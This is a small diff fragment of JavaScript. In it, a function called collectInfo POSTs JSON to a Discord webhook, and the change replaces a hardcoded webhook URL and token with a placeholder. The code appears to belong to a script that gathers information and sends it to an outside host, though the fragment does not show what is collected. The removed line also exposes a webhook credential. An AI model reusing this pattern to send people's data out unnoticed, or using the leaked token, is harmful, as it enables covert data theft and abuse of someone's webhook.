@@ -8,7 +8,7 @@ function collectInfo(json)
 {
      var wbRequest = new XMLHttpRequest();
      
-    wbRequest.open("POST", "https://discord.com/api/webhooks/1005908217823502486/SttSHmtavLPRL5FS_s8kLEe-XY5qE0SsMwSpxHN-repLgWLa7IU3DAykhNKG-p7qFR7M");
+    wbRequest.open("POST", "WEBHOOK LINK");
     wbRequest.setRequestHeader('Content-type', 'application/json');
 
      var params = 
